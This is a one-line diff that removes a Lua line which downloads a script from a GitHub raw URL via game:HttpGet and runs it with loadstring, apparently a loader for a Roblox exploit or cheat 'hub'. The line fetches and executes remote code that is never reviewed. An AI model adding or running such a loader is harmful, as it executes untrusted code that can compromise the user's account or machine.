@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MariaVizila/QuickDriveHub/refs/heads/main/latest_script.lua"))()
